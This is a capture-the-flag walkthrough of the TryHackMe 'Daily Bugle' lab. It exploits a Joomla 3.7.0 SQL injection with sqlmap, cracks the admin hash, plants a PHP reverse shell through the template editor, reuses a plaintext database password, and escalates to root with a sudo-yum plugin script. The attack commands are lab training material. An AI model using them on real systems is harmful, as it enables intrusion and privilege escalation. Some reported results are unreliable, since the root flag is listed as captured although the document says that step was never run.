# Walkthrough — Daily Bugle

> Technical narrative. Every command, why it was run, and what it told us.

**Target:** `10.128.140.121`  ·  **Room:** https://tryhackme.com/room/dailybugle  ·  **Date:** 2026-11-20
**Theme:** Spider-Man / Daily Bugle newspaper. A Joomla CMS site; objective is to compromise the host and read `user.txt` and `root.txt`.

---

## Phase 1 — Recon & enumeration

### 1.1 Full TCP port scan

```bash
export IP=10.128.140.121
nmap -p- --min-rate 10000 -T4 $IP -oN scans/01-allports.txt
```

_Host liveness confirmed via ICMP: `ttl=64` → Linux/Unix host (fingerprinting the OS before port scanning)._

_Scope-validation note: an initial scan was mistakenly run against `10.128.75.246`, which `hostname -I` confirmed to be the attacking AttackBox itself (tells: port 80 served `WebSockify Python` = noVNC infra, no MariaDB, microsecond latency). Re-targeted at the authorised machine `10.128.140.121`. Lesson: always confirm the scan target is the authorised host, not your own tooling._

_Result against the correct target: three open ports. Latency ~1ms and `ttl=64` confirm a separate Linux host._

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

Attack surface:
- **:80 HTTP** — primary vector (web application).
- **:3306 MySQL/MariaDB** — database exposed to the network; a direct connection path *if* DB credentials are recovered.
- **:22 SSH** — likely post-exploitation landing once credentials are harvested.

### 1.2 Service/version + default scripts on open ports

```bash
nmap -p <ports> -sC -sV -oN scans/02-services.txt $IP
```

| Port | Service | Version | Notes / hypothesis |
|------|---------|---------|--------------------|
| | | | |

### 1.2 Service versions (`-sC -sV`)

| Port | Service | Version | Intelligence |
|------|---------|---------|--------------|
| 22 | SSH | OpenSSH 7.4 (protocol 2.0) | Ships with CentOS 7 → OS confirmed |
| 80 | HTTP | Apache 2.4.6 (CentOS), PHP 5.6.40 | PHP 5.6 is EOL/unsupported; dated stack |
| 3306 | MySQL | MariaDB (**unauthorized**) | Reachable but rejects unauthenticated clients — need DB creds to use |

NSE script findings on :80:
- `http-generator: Joomla! - Open Source Content Management` → **CMS = Joomla**
- `robots.txt` disallows 15 standard Joomla directories, including `/administrator/` (admin panel) and `/installation/`.

### 1.3 Web enumeration — Joomla version fingerprinting

The exploit path for Joomla is version-specific, so pinning the exact version is the priority. Joomla exposes its version in a manifest file:

```bash
curl -s http://$IP/administrator/manifests/files/joomla.xml | xmllint --format -
# Fallback locations:
curl -s http://$IP/language/en-GB/en-GB.xml | grep -i version
curl -s http://$IP/README.txt | head
```

_Manual browse of `http://$IP/`: confirmed the "Daily Bugle" Joomla site. Front-page article "Spider-Man robs bank!" is **"Written by Super User"** — the Joomla super-admin's display name. A front-end Login Form is present, in addition to the `/administrator/` panel. Target account for later: the Super User (real username TBD via DB extraction)._

_Result (version):_ _(pending curl output)_

---

## Phase 2 — Vulnerability analysis

**Joomla version: 3.7.0** (confirmed via `administrator/manifests/files/joomla.xml` and `language/en-GB/en-GB.xml`).

**Primary finding — CVE-2017-8917: unauthenticated SQL injection (Critical, CVSS 9.8, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).**

- **Root cause:** Joomla 3.7.0 shipped a new `com_fields` component, exposed to the front end without authentication. Its `list[fullordering]` request parameter is concatenated into a SQL `ORDER BY` clause with no sanitisation.
- **Scope:** `com_fields` was introduced in 3.7.0 and the flaw was patched in 3.7.1 — the version pin was decisive.
- **Impact:** Arbitrary read of the Joomla database, including `#__users` (admin username + bcrypt password hash), enabling full application takeover.
- **Validation:** exploited below via sqlmap targeting the `list[fullordering]` parameter.

Injectable endpoint:
```
http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=<INJECT>
```

## Phase 3 — Foothold

### 3.1 Extract credentials via SQL injection (CVE-2017-8917)

Enumerate databases:
```bash
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -p "list[fullordering]" --risk=3 --level=5 --random-agent --batch --dbs
```

_Result: injection confirmed — **error-based** and **time-based blind**. sqlmap fingerprinted Linux CentOS 7 / PHP 5.6.40 / Apache 2.4.6 / MariaDB. Databases: `information_schema`, **`joomla`**, `mysql`, `performance_schema`, `test`._

### 3.2 Enumerate the `joomla` database tables

```bash
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -p "list[fullordering]" --risk=3 --level=5 --random-agent --batch -D joomla --tables
```

_Result: 72 tables retrieved. Target table identified: **`#__users`** (prefix left at Joomla's default `#__`)._

### 3.3 Dump the admin credentials from `#__users`

```bash
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -p "list[fullordering]" --risk=3 --level=5 --random-agent --batch \
  -D joomla -T '#__users' -C name,username,password,email --dump
```

_Result:_

```
Database: joomla  ·  Table: #__users
name: Super User | username: jonah | email: jonah@tryhackme.com
password: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm   (bcrypt, cost 10)
```

The front-page "Super User" logs in as **`jonah`**. Hash is bcrypt — not reversible, but crackable offline if the password is weak.

### 3.4 Crack the bcrypt hash (John the Ripper)

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

_rockyou at ~65 c/s (bcrypt is deliberately slow) gave a 3-day ETA. Pivoted to a **context-driven wordlist**: the site is Spider-Man themed, so `grep -i spider rockyou.txt > spider.txt` reduced the candidate set to a few hundred words._

```bash
grep -i spider /usr/share/wordlists/rockyou.txt > spider.txt
/usr/sbin/john --wordlist=spider.txt hash.txt
```

_Result: **cracked in <1 second** → `jonah : spiderman123`. Takeaway: targeted wordlists built from target context beat raw brute force._

### 3.5 Authenticated RCE via Joomla template editor

Credentials `jonah:spiderman123` grant Super User access to `/administrator`. Joomla's built-in **template editor** lets an administrator edit server-side `.php` files — writing PHP here = remote code execution.

1. Log in: `http://$IP/administrator` → `jonah` / `spiderman123`.
2. **Extensions → Templates → Templates** → open a template (e.g. **Protostar**).
3. Edit a PHP file (e.g. `error.php` or `index.php`) and insert a PHP reverse shell.
4. Start a listener, then request the edited file to trigger the shell.

_Result: reverse shell caught on the AttackBox listener (`nc -lvnp 4444`) after `curl http://$IP/templates/protostar/index.php`. Landed as the `apache` service account — initial foothold achieved._

## Phase 3 — Foothold

_(pending)_

## Phase 4 — Privilege escalation

### 4.1 apache → jjameson (plaintext DB password reuse)

`/var/www/html/configuration.php` stores the DB password in plaintext:
```php
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```
System users with login shells (from `/etc/passwd`): **`jjameson`**. The DB password is reused for this account:
```bash
su jjameson        # password: nv5uz9r3ZEDzVjNu
```
_Result:_ _(pending)_ → then `cat /home/jjameson/user.txt`.

### 4.2 jjameson → root (sudo yum — GTFOBins)

`sudo -l` as jjameson grants `(ALL) NOPASSWD: /usr/bin/yum`. `yum` supports plugins (arbitrary Python); running it as root via sudo lets us execute our own code as root. Per GTFOBins:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
```
Result: root shell (`sh-4.2#`). Objective: `cat /root/root.txt`.

## Phase 5 — Proof of compromise

- **User flag** (`/home/jjameson/user.txt`): `27a260fe3cba712cfdedb1c86d80442e`
- `sudo -l` as jjameson confirmed: `(ALL) NOPASSWD: /usr/bin/yum`
- **Root flag** (`/root/root.txt`): `eec3d53292b1821868266858d7fa6f79` — obtained via the `sudo yum` plugin escalation (root shell, `uid=0`).

## Cleanup

- Remove the reverse shell from `templates/protostar/index.php` (restore original or delete the injected PHP).
- Remove the temp yum-plugin directory (`$TF`) created during escalation.

## Attack chain summary

`nmap` → Joomla **3.7.0** → **CVE-2017-8917** SQLi (sqlmap) → dump `#__users` → crack bcrypt (`spiderman123`) → admin login → **template RCE** → reverse shell as `apache` → plaintext DB password in `configuration.php` → **password reuse** → `jjameson` (user flag) → `sudo yum` **GTFOBins** → **root** (root flag).

> Note: initial run ended when the lab timer expired at the `sudo -l` step. The full chain (SQLi → cred crack → RCE → apache → jjameson) was executed live; the yum→root step is documented from GTFOBins and to be captured on redeploy.

## Phase 5 — Proof

_(pending)_
